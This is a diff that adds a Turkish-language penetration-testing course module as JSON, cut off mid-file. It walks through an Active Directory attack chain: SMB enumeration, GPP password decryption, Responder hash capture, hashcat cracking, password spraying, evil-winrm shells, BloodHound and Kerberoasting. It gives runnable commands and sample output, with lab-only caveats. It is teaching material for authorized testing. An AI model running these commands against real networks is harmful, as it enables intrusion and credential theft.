@@ -1,0 +1,503 @@
+{
+  "id": "ad-saldiri-zinciri",
+  "slug": "ad-saldiri-zinciri",
+  "title": "AD Saldırı Zinciri — SMB'den Domain Admin'e",
+  "subtitle": "Gerçek bir iç ağ pentest hikâyesi: adım adım, neden-nasıl",
+  "description": "Port 445 açık → SMB enum → kullanıcı listesi → password spray → foothold → BloodHound → Kerberoasting → DCSync → Domain Admin. Her adımda 'neden bu çalışır' ve 'saldırgan ne düşünüyor' açıklamasıyla tam AD saldırı zinciri.",
+  "icon": "GitBranch",
+  "order": 3,
+  "tags": ["active directory", "ad", "smb", "kerberoasting", "bloodhound", "responder", "llmnr", "dcsync", "golden ticket", "pass-the-hash", "domain admin", "impacket", "netexec", "lateral movement"],
+  "modules": [
+    {
+      "id": "ortam-ve-hedef",
+      "title": "Sahne Kurulumu — Ortamı Anlamak",
+      "description": "AD saldırısına başlamadan önce: hangi portlar 'burada AD var' der, domain yapısı nasıl çalışır ve saldırgan olarak neyi arıyorsun.",
+      "difficulty": "beginner",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "ad-neden-hedef",
+          "type": "theory",
+          "title": "Active Directory Neden Her Zaman Hedef?",
+          "content": "**Active Directory (AD)**, bir şirketin tüm kullanıcılarını, bilgisayarlarını, politikalarını ve kaynaklarını tek yerden yöneten merkezi kimlik altyapısıdır. Dünya genelinde şirketlerin %90'ından fazlası AD kullanır.\n\nSaldırgan için AD'nin değeri:\n- **Tek nokta, sonsuz erişim:** Domain Admin ol → ağdaki her makineye, her dosyaya, her sisteme erişim.\n- **Credential'lar her yerde:** Hash'ler RAM'de, disk'te, log'larda — çeşitli yollarla elde edilebilir.\n- **Yaşlı altyapı:** Çoğu AD ortamı 10+ yıllık yanlış yapılandırma biriktirir — eski protokoller, zayıf parola politikaları, fazla yetki verilmiş hesaplar.\n- **Lateral movement kolaylığı:** Bir makineyi ele geçirince diğerlerine geçmek için credential'lar genellikle hazır.\n\n### Saldırgan kafasında soru sırası\n1. Ağda DC (Domain Controller) var mı? Hangi IP?\n2. Hangi kullanıcılar var? Hangi gruplar?\n3. Hangi servis hesapları var? (Kerberoasting hedefi)\n4. Hangi makinede kim oturum açmış? (Lateral için)\n5. DA'ya (Domain Admin) en kısa yol nedir?\n\nBu soruların cevapları genellikle **ek bir zafiyet gerekmeden** — sadece geçerli bir domain hesabıyla — elde edilir. AD'nin doğası gereği, üye olan herkes çok şey sorabilir."
+        },
+        {
+          "id": "ad-portlari",
+          "type": "commands",
+          "title": "AD'yi Tanıyan Port Taraması",
+          "content": "Nmap çıktısında şunları görünce 'burada AD var' dersin:",
+          "commands": [
+            {
+              "command": "nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 -sV --open 192.168.1.0/24",
+              "description": "AD'ye özgü portları hedef ağda tara. Birkaç tanesi aynı makinede görünürse DC bulmuşsundur.",
+              "output": "Nmap scan report for 192.168.1.10\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp  open  microsoft-ds  Windows Server 2019\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)\n\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows",
+              "tip": "Port 88 (Kerberos) + 389 (LDAP) + 445 (SMB) = DC. hostname 'DC01' gibi görünüyorsa kesin.",
+              "flags": [
+                { "flag": "Port 88", "description": "Kerberos authentication — kesin AD işareti" },
+                { "flag": "Port 389/3268", "description": "LDAP / Global Catalog — AD sorgu portu" },
+                { "flag": "Port 445", "description": "SMB — kullanıcı enum, hash yakalama, lateral movement" },
+                { "flag": "Port 5985", "description": "WinRM — PowerShell uzak erişim (evil-winrm)" },
+                { "flag": "Port 3389", "description": "RDP — doğrudan masaüstü erişim" }
+              ]
+            },
+            {
+              "command": "nmap -p 445 --script smb-os-discovery,smb2-security-mode 192.168.1.10",
+              "description": "SMB üzerinden OS, domain adı ve SMB imzalama durumunu öğren.",
+              "output": "Host script results:\n| smb-os-discovery:\n|   OS: Windows Server 2019 Standard (Windows Server 2019 Standard 6.3)\n|   Computer name: DC01\n|   NetBIOS computer name: DC01\\x00\n|   Domain name: corp.local\n|   Forest name: corp.local\n|   FQDN: DC01.corp.local\n|_  System time: 2024-01-15T10:23:41+00:00\n| smb2-security-mode:\n|   3.1.1:\n|_    Message signing enabled but not required",
+              "tip": "SMB imzalama 'not required' → NTLM relay saldırısı mümkün. Bu çok önemli bir bulgu. Domain adı: corp.local — tüm sonraki komutlarda kullanacaksın."
+            }
+          ]
+        },
+        {
+          "id": "senaryo-kurgsu",
+          "type": "theory",
+          "title": "Senaryo Kurgusu — Bu Hikâyede Ne Varsayıyoruz?",
+          "content": "**Angajman türü:** Internal (iç ağ) pentest — grey box.\n**Başlangıç noktası:** Ağda bir makine (Kali) var, aktif bir domain hesabımız yok.\n**Hedef:** Domain Admin olmak.\n\n**Ağ haritası (keşfedilecek):**\n```\n192.168.1.0/24\n├── 192.168.1.10  → DC01.corp.local (Domain Controller)\n├── 192.168.1.20  → SRV01.corp.local (Windows Server — dosya sunucusu)\n├── 192.168.1.30  → WEB01.corp.local (Web sunucusu)\n└── 192.168.1.100 → KALI (saldırgan makinesi)\n```\n\n**Bu modülde izleyeceğimiz yol:**\n1. SMB enumeration → kullanıcı listesi (hesap yok)\n2. LLMNR poisoning → NetNTLMv2 hash → kır → ilk hesap\n3. BloodHound ile AD haritası → DA'ya en kısa yol\n4. Kerberoasting → servis hesabı hash'i → kır\n5. DCSync → tüm hash'ler → DA\n6. Golden Ticket → kalıcı erişim\n\n> Tüm adımlar **yalnızca yetkili lab ortamında** geçerlidir: HackTheBox, TryHackMe Active Directory path'leri veya kendi kurduğun lab. Bu modül gerçek bir AD ortamının yetkilendirilmiş testi veya izole lab içindir."
+        }
+      ]
+    },
+    {
+      "id": "smb-enum-ilk-erisim",
+      "title": "SMB Enumeration — Hesap Olmadan Ne Öğrenilir?",
+      "description": "Hiç domain hesabı yokken SMB üzerinden kullanıcı listesi, paylaşımlar ve parola politikası nasıl çekilir — null session, RID cycling ve kerbrute.",
+      "difficulty": "beginner",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "null-session",
+          "type": "theory",
+          "title": "Null Session Nedir, Neden Hâlâ Çalışır?",
+          "content": "**Null session**, kullanıcı adı ve parola vermeden SMB'ye bağlanma girişimidir. Eski Windows sürümlerinde varsayılan olarak açıktı; modern AD'de kapalı ama **yanlış yapılandırılmış** ortamlarda hâlâ çalışır.\n\nNull session açıksa:\n- Domain kullanıcı listesi alınabilir (RID cycling)\n- Paylaşımlar listelenebilir\n- Parola politikası (lockout threshold!) öğrenilebilir\n\nNull session kapalı olsa bile:\n- Bazı araçlar anonim LDAP ile kullanıcı listesi çekebilir\n- Kerberos pre-auth hatasıyla geçerli kullanıcılar doğrulanabilir (kerbrute — parola denemesiz)\n\n**Neden önemli?** Kullanıcı listesi olmadan password spray kör atış olur; lockout threshold bilmeden spray yaparsan tüm hesapları kilitlersin → müşteri uyarısı ve test iptal."
+        },
+        {
+          "id": "smb-enum-komutlar",
+          "type": "commands",
+          "title": "Adım 1 — SMB Enumeration Komutları",
+          "commands": [
+            {
+              "command": "netexec smb 192.168.1.10 -u '' -p ''",
+              "description": "Null session dene — boş kullanıcı adı ve parola ile SMB'ye bağlan.",
+              "output": "SMB  192.168.1.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)\nSMB  192.168.1.10  445  DC01  [+] corp.local\\: (Guest)",
+              "tip": "[+] görüyorsan null session açık. Devam et."
+            },
+            {
+              "command": "netexec smb 192.168.1.10 -u '' -p '' --shares",
+              "description": "Null session ile erişilebilir paylaşımları listele.",
+              "output": "SMB  192.168.1.10  445  DC01  Share           Permissions     Remark\nSMB  192.168.1.10  445  DC01  -----           -----------     ------\nSMB  192.168.1.10  445  DC01  ADMIN$                          Remote Admin\nSMB  192.168.1.10  445  DC01  C$                              Default share\nSMB  192.168.1.10  445  DC01  IPC$            READ            Remote IPC\nSMB  192.168.1.10  445  DC01  SYSVOL          READ            Logon server share\nSMB  192.168.1.10  445  DC01  NETLOGON        READ            Logon server share",
+              "tip": "SYSVOL READ → GPP (Group Policy Preferences) şifreli parolaları arayabiliriz. Eski AD'lerde goldmine."
+            },
+            {
+              "command": "netexec smb 192.168.1.10 -u '' -p '' --pass-pol",
+              "description": "Parola politikasını öğren — PASSWORD SPRAY YAPMADAN ÖNCE ZORUNLU.",
+              "output": "SMB  192.168.1.10  445  DC01  [+] Dumping password policy\nSMB  192.168.1.10  445  DC01  Minimum password length: 8\nSMB  192.168.1.10  445  DC01  Password history length: 24\nSMB  192.168.1.10  445  DC01  Maximum password age: 90 days\nSMB  192.168.1.10  445  DC01  Password Complexity Flags: 0000001\nSMB  192.168.1.10  445  DC01  Bad password count: 0\nSMB  192.168.1.10  445  DC01  Password lockout threshold: 5\nSMB  192.168.1.10  445  DC01  Lockout duration: 30 mins",
+              "warning": "Lockout threshold: 5 → 5 yanlış denemede hesap kilitlenir. Spray'de en fazla 1-2 deneme yap, aralarında 30+ dk bekle."
+            },
+            {
+              "command": "enum4linux -a 192.168.1.10 2>/dev/null | tee enum4linux-out.txt",
+              "description": "Kapsamlı SMB enumeration — kullanıcılar, gruplar, paylaşımlar, OS bilgisi.",
+              "output": "[+] Enumerating users using SID S-1-5-21-...\n user:[Administrator] rid:[0x1f4]\n user:[Guest] rid:[0x1f5]\n user:[DC01$] rid:[0x3e8]\n user:[john.doe] rid:[0x44f]\n user:[jane.smith] rid:[0x450]\n user:[svc_backup] rid:[0x451]\n user:[svc_mssql] rid:[0x452]",
+              "tip": "svc_backup ve svc_mssql — bunlar servis hesapları. Kerberoasting'in birincil hedefi. Hemen not al."
+            },
+            {
+              "command": "kerbrute userenum --dc 192.168.1.10 -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+              "description": "Null session kapalıysa: Kerberos pre-auth hatasıyla geçerli kullanıcıları tespit et. Parola denemesi yapmaz — kilitlenme riski yok.",
+              "output": "[*] VALID USERNAME: administrator@corp.local\n[*] VALID USERNAME: john.doe@corp.local\n[*] VALID USERNAME: jane.smith@corp.local\n[*] VALID USERNAME: svc_backup@corp.local\n[*] VALID USERNAME: svc_mssql@corp.local",
+              "tip": "kerbrute, 'KDC_ERR_PREAUTH_REQUIRED' hatası alıyorsa kullanıcı geçerli demektir. Parola yanlış olsa bile bu hata gelir — dolayısıyla kilitlenme olmaz."
+            }
+          ]
+        },
+        {
+          "id": "sysvol-gpp",
+          "type": "commands",
+          "title": "Bonus: SYSVOL'de Gömülü Parola (GPP — Group Policy Preferences)",
+          "content": "SYSVOL okuma iznimiz vardı. Eski AD ortamlarında GPO içinde şifrelenmiş (ama kırılabilir) parolalar bulunur:",
+          "commands": [
+            {
+              "command": "smbclient //192.168.1.10/SYSVOL -N -c 'recurse ON; ls'",
+              "description": "SYSVOL içindeki tüm dosyaları listele — Groups.xml, Drives.xml, Services.xml ara.",
+              "output": "...\\Policies\\{GUID}\\MACHINE\\Preferences\\Groups\\Groups.xml\n...\\Policies\\{GUID}\\MACHINE\\Preferences\\Drives\\Drives.xml"
+            },
+            {
+              "command": "smbclient //192.168.1.10/SYSVOL -N -c 'get \"corp.local/Policies/{GUID}/MACHINE/Preferences/Groups/Groups.xml\"'  && cat Groups.xml",
+              "description": "Groups.xml dosyasını çek — içindeki cpassword alanı AES-256 ile şifrelenmiş ama anahtarı Microsoft 2012'de yayımladı.",
+              "output": "<Groups><User><Properties action=\"U\" userName=\"localadmin\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ7k0Ks/8LF3z8L...\"/></User></Groups>"
+            },
+            {
+              "command": "gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ7k0Ks/8LF3z8L...'",
+              "description": "Kali'de gpp-decrypt aracıyla şifreyi çöz — anahtarı Microsoft yayımladığı için %100 tersine çevrilebilir.",
+              "output": "Localadmin@2023!",
+              "tip": "Bu yöntem MS14-025 (KB2962486) ile 2014'te yamalandı ama eski GPO'lar temizlenmeden kalıyor. Hâlâ sıkça çıkar."
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "llmnr-hash-spray",
+      "title": "LLMNR Zehirleme → Hash → Password Spray → İlk Shell",
+      "description": "Hesap yoksa ağdan hash çal: LLMNR/NBT-NS poisoning ile NetNTLMv2 yakala, kır ve geçerli bir domain hesabıyla evil-winrm üzerinden ilk shell'i al.",
+      "difficulty": "intermediate",
+      "duration": "35 dk",
+      "sections": [
+        {
+          "id": "llmnr-theory",
+          "type": "theory",
+          "title": "LLMNR Poisoning Neden Çalışır?",
+          "content": "**LLMNR (Link-Local Multicast Name Resolution)** ve **NBT-NS**, DNS çözümlemesi başarısız olduğunda Windows'un ağa multicast soru sorduğu protokollerdir:\n\n**Senaryo:**\n1. Kullanıcı Explorer'da `\\\\fileservr\\paylaşım` yazar (typo: fileservr, fileserver yerine).\n2. DNS bu ismi çözemez.\n3. Windows ağa sorar: 'fileservr kim?'\n4. **Responder** (Kali) 'Ben!' der → kullanıcının makinesi Kali'ye kimlik doğrulama girişiminde bulunur.\n5. Bu girişim **NetNTLMv2 hash** içerir — parolanın kriptografik karması.\n6. Hash'i yakalarız, offline kırarız → düz parola.\n\n**Neden hâlâ çalışır?** LLMNR Windows Vista'dan beri varsayılan **açık** gelir. Çoğu AD ortamı bunu kapatmayı unutur veya bilmez.\n\n**NTLM Relay farkı:** Hash'i kırmak yerine doğrudan başka bir hedefe iletebiliriz (relay). SMB imzalama 'not required' ise relay çok güçlüdür — bu senaryoda hash kırma yolunu izleyeceğiz."
+        },
+        {
+          "id": "responder-komutlar",
+          "type": "commands",
+          "title": "Adım 2 — Responder ile Hash Yakalama",
+          "commands": [
+            {
+              "command": "responder -I eth0 -rdwv",
+              "description": "Responder'ı başlat — LLMNR, NBT-NS ve MDNS isteklerini dinle ve yanıtla.",
+              "output": "[+] Listening for events...\n[SMB] NTLMv2-SSP Client   : 192.168.1.20\n[SMB] NTLMv2-SSP Username : CORP\\john.doe\n[SMB] NTLMv2-SSP Hash     : john.doe::CORP:4141414141414141:A1B2C3D4E5F6...:0101000000000000...",
+              "tip": "Sabırla bekle — ofis saatlerinde çok daha fazla hit alırsın. Öğle vakti mola dönüşleri altın.",
+              "flags": [
+                { "flag": "-I eth0", "description": "Dinlenecek ağ arayüzü" },
+                { "flag": "-r", "description": "NBNS (NetBIOS Name Service) yanıtları" },
+                { "flag": "-d", "description": "DHCP yanıtları (ağ genelinde zehirleme)" },
+                { "flag": "-w", "description": "WPAD proxy otomatik keşif yanıtları" },
+                { "flag": "-v", "description": "Verbose — tüm istekleri göster" }
+              ]
+            },
+            {
+              "command": "cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.1.20.txt",
+              "description": "Yakalanan hash'leri responder log dosyasından al.",
+              "output": "john.doe::CORP:4141414141414141:A1B2C3D4E5F67890ABCDEF1234567890:0101000000000000C0653150DE0FD80100000000000000000000000000"
+            },
+            {
+              "command": "hashcat -m 5600 john_hash.txt /usr/share/wordlists/rockyou.txt --force",
+              "description": "NetNTLMv2 hash'ini kır — hashcat mode 5600.",
+              "output": "john.doe::CORP:4141...:A1B2...  → Welcome1!\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\nTime.Started.....: ...\nSpeed.#1.........: 4532.7 MH/s (GPU)\nRecovered........: 1/1 (100.00%) Digests",
+              "tip": "Rockyou ile kırılamazsa: hashcat -m 5600 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule — kural dosyaları çok daha geniş kombinasyon dener.",
+              "flags": [
+                { "flag": "-m 5600", "description": "NetNTLMv2 hash türü" },
+                { "flag": "-m 5500", "description": "NetNTLMv1 (daha eski, daha hızlı kırılır)" },
+                { "flag": "--force", "description": "GPU uyumluluk uyarısını geç" },
+                { "flag": "-r best64.rule", "description": "Kural tabanlı mutasyon — Welcome1, P@ssw0rd vb." }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "spray-ve-shell",
+          "type": "commands",
+          "title": "Adım 3 — Kimlik Doğrulama ve Shell",
+          "commands": [
+            {
+              "command": "netexec smb 192.168.1.10 -u 'john.doe' -p 'Welcome1!'",
+              "description": "Kırılan parola ile DC'ye karşı kimlik doğrula — geçerli mi kontrol et.",
+              "output": "SMB  192.168.1.10  445  DC01  [+] corp.local\\john.doe:Welcome1!"
+            },
+            {
+              "command": "netexec smb 192.168.1.0/24 -u 'john.doe' -p 'Welcome1!' --continue-on-success",
+              "description": "Aynı parolayla tüm alt ağı tara — hangi makinelerde bu hesap geçerli? (Credential reuse çok yaygın.)",
+              "output": "SMB  192.168.1.10  445  DC01   [+] corp.local\\john.doe:Welcome1!\nSMB  192.168.1.20  445  SRV01  [+] corp.local\\john.doe:Welcome1!\nSMB  192.168.1.30  445  WEB01  [+] corp.local\\john.doe:Welcome1!"
+            },
+            {
+              "command": "netexec smb 192.168.1.20 -u 'john.doe' -p 'Welcome1!' --shares",
+              "description": "SRV01'deki paylaşımlara bak — dosya sunucusunda hassas veri olabilir.",
+              "output": "SMB  192.168.1.20  445  SRV01  Share        Permissions\nSMB  192.168.1.20  445  SRV01  Finance      READ\nSMB  192.168.1.20  445  SRV01  HR           READ,WRITE\nSMB  192.168.1.20  445  SRV01  IT-Backup    READ",
+              "tip": "IT-Backup → içinde şifresiz yapılandırma dosyaları, SSH key, başka credential olabilir. Mutlaka bak."
+            },
+            {
+              "command": "netexec winrm 192.168.1.20 -u 'john.doe' -p 'Welcome1!'",
+              "description": "john.doe WinRM grubunda mı? İzin varsa PowerShell shell açılabilir.",
+              "output": "WINRM  192.168.1.20  5985  SRV01  [+] corp.local\\john.doe:Welcome1! (Pwn3d!)"
+            },
+            {
+              "command": "evil-winrm -i 192.168.1.20 -u 'john.doe' -p 'Welcome1!'",
+              "description": "WinRM üzerinden etkileşimli PowerShell shell al — ilk gerçek foothold.",
+              "output": "Evil-WinRM shell v3.5\n\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\john.doe\\Documents> whoami\ncorp\\john.doe\n*Evil-WinRM* PS C:\\Users\\john.doe\\Documents> hostname\nSRV01",
+              "tip": "Shell aldık! Ama john.doe normal kullanıcı — DA değil. Şimdi işin asıl kısmı başlıyor: AD haritası ve yetki yükseltme."
+            }
+          ]
+        },
+        {
+          "id": "spray-alternatif",
+          "type": "advanced",
+          "title": "Alternatif: Password Spray (Hash Olmadan)",
+          "content": "LLMNR'den hash gelmezse, kullanıcı listesi elimizdeyse **password spray** dene:\n\n```bash\n# Yaygın kurumsal parola kombinasyonları — önce lockout politikasını öğren!\nnetexec smb 192.168.1.10 -u users.txt -p 'Welcome1' --no-bruteforce\nnetexec smb 192.168.1.10 -u users.txt -p 'Şirket2024!' --no-bruteforce\nnetexec smb 192.168.1.10 -u users.txt -p 'Password123' --no-bruteforce\n```\n\n**Spray stratejisi:**\n- Tek turda **1 parola**, tüm kullanıcılara. Sonra 30+ dk bekle.\n- Dene: `Şirket+Yıl`, `Mevsim+Yıl`, `Hoşgeldiniz1`, `Welcome1`, `P@ssw0rd`.\n- Lockout threshold 5 ise: güvenli sınır 2-3 deneme/hesap/gün.\n\n**Neden tek parola ile tüm kullanıcılar?** Binlerce kullanıcıdan birinin zayıf parola kullanma ihtimali yüksek. Bir hesabı 100 kere denemek yerine 100 hesabı 1 kere denemek çok daha güvenli (lockout açısından) ve genellikle daha etkili.\n\n> **Senior notu:** Gerçek angajmanda spray öncesi mutlaka müşteriyi bilgilendir — kazara kilitlenme olursa 'test yüzünden kullanıcılar giremiyor' şikayeti gelir. Bazı müşteriler spray'i açıkça yasaklar (RoE)."
+        }
+      ]
+    },
+    {
+      "id": "bloodhound-harita",
+      "title": "BloodHound — 'DA'ya Nasıl Giderim?'",
+      "description": "john.doe hesabıyla AD'yi haritalandır: hangi yoldan Domain Admin olunur, hangi hesap zincirleme saldırıya açık, kısayol var mı?",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "bloodhound-theory",
+          "type": "theory",
+          "title": "BloodHound'un Sihri: Graf Teorisi ile AD Saldırısı",
+          "content": "**BloodHound**, AD'yi bir **graf veritabanı** olarak modeller: düğümler (kullanıcılar, gruplar, makineler, GPO'lar) ve kenarlar (ilişkiler: MemberOf, AdminTo, HasSession, CanRCE, GenericWrite...). Sonra en kısa saldırı yolunu hesaplar.\n\nManuel olarak 'john.doe'dan Domain Admin'e yol var mı?' sorusunu cevaplamak için yüzlerce AD ilişkisini tek tek kontrol etmek saatler alır. BloodHound bunu **saniyeler** içinde yapar.\n\n**Neden değerli?** AD yanlış yapılandırmaları çok yaygın:\n- John'un yönettiği bir makine → o makinede admin oturumu olan bir hesap → o hesabın da başka haklari var...\n- Zincirleme haklar 10 adım olabilir ama BloodHound hepsini görür.\n\n**Veri toplama:** SharpHound (Windows'ta) veya bloodhound-python (Kali'den) çalıştırılır, AD'yi LDAP ve SMB üzerinden sorgular, ZIP olarak çıktı verir. Bu ZIP BloodHound'a import edilir."
+        },
+        {
+          "id": "bloodhound-komutlar",
+          "type": "commands",
+          "title": "Adım 4 — BloodHound Veri Toplama ve Analiz",
+          "commands": [
+            {
+              "command": "bloodhound-python -u 'john.doe' -p 'Welcome1!' -d corp.local -dc DC01.corp.local -c All --zip",
+              "description": "Kali'den doğrudan BloodHound verisi topla — shell açmana gerek yok.",
+              "output": "INFO: Found AD domain: corp.local\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC01.corp.local\nINFO: Found 1 domains\nINFO: Found 3 computers\nINFO: Found 12 users\nINFO: Found 8 groups\nINFO: Compressing output into 20240115123456_BloodHound.zip",
+              "flags": [
+                { "flag": "-c All", "description": "Tüm kolektörler: DCOnly, Group, LocalAdmin, Session, Trusts, Default, RDP, DCOM, PSRemote" },
+                { "flag": "-c DCOnly", "description": "Sadece DC'den veri — daha hızlı, daha az gürültü" },
+                { "flag": "--zip", "description": "Çıktıyı ZIP olarak paketler — BloodHound'a direkt yüklenir" }
+              ]
+            },
+            {
+              "command": "# Evil-WinRM shell içindeyken SharpHound çalıştır:\nupload /opt/SharpHound.exe\n./SharpHound.exe -c All --zipfilename corp_data.zip\ndownload corp_data.zip",
+              "description": "Alternatif: Shell üzerinden SharpHound çalıştır ve ZIP'i indir. Daha kapsamlı LocalAdmin ve Session verisi toplar.",
+              "tip": "SharpHound.exe AV tarafından yakalanabilir. Gizlilik gerekiyorsa: SharpHound.ps1 (obfuscated) veya bloodhound-python uzaktan daha temiz."
+            },
+            {
+              "command": "# BloodHound arayüzünde (neo4j başlat sonra bloodhound):\nnio4j console &\nbloodhound &\n# ZIP'i import et, sonra sorgu çalıştır:\n# 'Shortest Paths to Domain Admins from Owned Principals'",
+              "description": "BloodHound GUI'de veriyi analiz et — john.doe'yu 'owned' işaretle, DA'ya en kısa yolu bul.",
+              "output": "john.doe → MemberOf → IT-Support\n  IT-Support → AdminTo → SRV01\n    SRV01 → HasSession → svc_mssql\n      svc_mssql → MemberOf → Domain Admins"
+            },
+            {
+              "command": "# BloodHound Cypher sorguları (Neo4j konsolunda):\nMATCH p=shortestPath((u:User {name:'JOHN.DOE@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p",
+              "description": "Cypher diliyle manuel en kısa yol sorgusu — GUI olmadan da çalıştırılabilir.",
+              "tip": "Diğer faydalı sorgular: 'All Kerberoastable Users', 'Users with DCSync Rights', 'Computers where Domain Users are Local Admin'"
+            }
+          ]
+        },
+        {
+          "id": "bloodhound-bulgulari",
+          "type": "advanced",
+          "title": "BloodHound'da Ne Arıyoruz?",
+          "content": "BloodHound'da en değerli bulgular:\n\n### 1. Kerberoastable Hesaplar\nSPN'si olan tüm kullanıcılar — yani Kerberoasting hedefleri.\n```\nBulgu: svc_mssql — SPN: MSSQLSvc/SRV01.corp.local:1433\nBulgu: svc_backup — SPN: backup/SRV01.corp.local\n```\n\n### 2. AS-REP Roastable Hesaplar\nKerberos pre-auth devre dışı olan hesaplar — parola olmadan hash alınabilir.\n\n### 3. Owned'dan DA'ya Yol\n'Shortest Paths to Domain Admins from Owned Principals' → tek tık.\n\n### 4. AdminTo Kenarları\nKim, hangi makinede local admin? → HasSession + AdminTo zinciri en sık kullanılan lateral yol.\n\n### 5. GenericWrite / GenericAll\nBir kullanıcı başka bir kullanıcının özelliklerini yazabilir → SPN ekle → Kerberoast → hash kır → hedef kullanıcı parolasını sıfırla.\n\n### 6. DCSync Hakları\nGetChanges + GetChangesAll → DCSync → tüm hash dump. Genellikle sadece Domain Admins, Enterprise Admins ve DC bilgisayar hesaplarında. Ama bazen yanlışlıkla normal kullanıcılara da verilmiş.\n\n> BloodHound'un bulduğu her 'kenar' bir saldırı fırsatıdır. Senior, ilk yolu değil **en sessiz ve en az iz bırakan** yolu seçer."
+        }
+      ]
+    },
+    {
+      "id": "kerberoasting-asrep",
+      "title": "Kerberoasting ve AS-REP Roasting — Hash Fabrikası",
+      "description": "Domain hesabıyla aktif brute force yapmadan servis hesaplarının hash'lerini al ve offline kır — Kerberos'un tasarımından kaynaklanan zafiyet.",
+      "difficulty": "intermediate",
+      "duration": "30 dk",
+      "sections": [
+        {
+          "id": "kerberoast-theory",
+          "type": "theory",
+          "title": "Kerberoasting Neden Çalışır? (Kerberos'u Anlamak)",
+          "content": "**Kerberos**, AD'nin kimlik doğrulama protokolüdür. Çalışma mantığı:\n\n1. Kullanıcı → DC: 'Ben john.doe, bana TGT ver' (AS-REQ)\n2. DC → Kullanıcı: İşte TGT (AS-REP) — krbtgt hash'iyle şifreli\n3. Kullanıcı → DC: 'Şu servise erişmek istiyorum, bana TGS ver' (TGS-REQ)\n4. DC → Kullanıcı: İşte TGS (servis bileti) — **servis hesabının NTLM hash'iyle şifreli**\n\n**Zafiyet nerede?** 4. adımda DC, servis biletini **servis hesabının parolasından türetilen hash** ile şifreler ve kullanıcıya verir. Kullanıcı bu bileti alıp offline olarak kırabilir. DC bunu kontrol etmez.\n\n**Gereksinim:** Sadece geçerli bir domain hesabı. john.doe yeterli. Domain üyesi herkes herhangi bir servis için bilet isteyebilir.\n\n**Neden servis hesapları kolay kırılır?**\n- Servis hesapları genellikle karmaşık parola gerektirmez.\n- Büyük şirketlerde IT ekibi bunları yaratır ve unutur.\n- Bazen yıllarca değiştirilmez.\n- Zaman zaman yönetici ayrıcalıkları verilmiş olur."
+        },
+        {
+          "id": "kerberoast-komutlar",
+          "type": "commands",
+          "title": "Adım 5 — Kerberoasting",
+          "commands": [
+            {
+              "command": "impacket-GetUserSPNs corp.local/john.doe:'Welcome1!' -dc-ip 192.168.1.10 -request",
+              "description": "SPN'li tüm hesaplar için Kerberos servis bileti al ve hash formatında yaz.",
+              "output": "ServicePrincipalName                Name        MemberOf                PasswordLastSet\n--------------------                ----        --------                ---------------\nMSSQLSvc/SRV01.corp.local:1433      svc_mssql                           2020-03-15\nbackup/SRV01.corp.local             svc_backup  Backup Operators         2019-07-20\n\n$krb5tgs$23$*svc_mssql$CORP.LOCAL$corp.local/svc_mssql*$A1B2C3D4E5F6...:0101000000000000...",
+              "tip": "PasswordLastSet 2020 → 4 yıl değişmemiş → zayıf parola ihtimali yüksek. svc_backup → Backup Operators grubunda → yüksek yetkili!",
+              "flags": [
+                { "flag": "-request", "description": "Sadece liste değil, hash'leri de al" },
+                { "flag": "-outputfile kerberoast.txt", "description": "Hash'leri dosyaya yaz" },
+                { "flag": "-usersfile hedefler.txt", "description": "Yalnızca belirtilen kullanıcılar için bilet al" }
+              ]
+            },
+            {
+              "command": "hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
+              "description": "Kerberoast hash'ini kır — mode 13100 (TGS-REP etype 23).",
+              "output": "$krb5tgs$23$*svc_mssql$...$... → Mssql@2020!\n\nStatus: Cracked",
+              "tip": "Kırılamazsa özel wordlist dene: şirket adı, yıl kombinasyonları. svc_mssql → Mssql2020, MSSQLservice! gibi tahmin edilebilir.",
+              "flags": [
+                { "flag": "-m 13100", "description": "RC4 şifreli TGS (en yaygın, en hızlı kırılır)" },
+                { "flag": "-m 19600", "description": "AES-128 TGS (daha yavaş)" },
+                { "flag": "-m 19700", "description": "AES-256 TGS (en yavaş — şirketler bu geçişi yaparsa kırmak zorlaşır)" }
+              ]
+            }
+          ]
+        },
+        {
+          "id": "asrep-komutlar",
+          "type": "commands",
+          "title": "AS-REP Roasting (Pre-Auth Devre Dışı Hesaplar)",
+          "content": "Bazı hesaplarda 'Do not require Kerberos preauthentication' seçeneği açık olabilir — bu hesaplar için **domain hesabına bile gerek yok**, anonim olarak hash alınabilir.",
+          "commands": [
+            {
+              "command": "impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10",
+              "description": "Hesap gerekmeden pre-auth devre dışı hesapların hash'lerini al.",
+              "output": "$krb5asrep$23$jane.smith@CORP.LOCAL:A1B2C3D4...:0101000...",
+              "tip": "Bu hash mode 18200 ile kırılır."
+            },
+            {
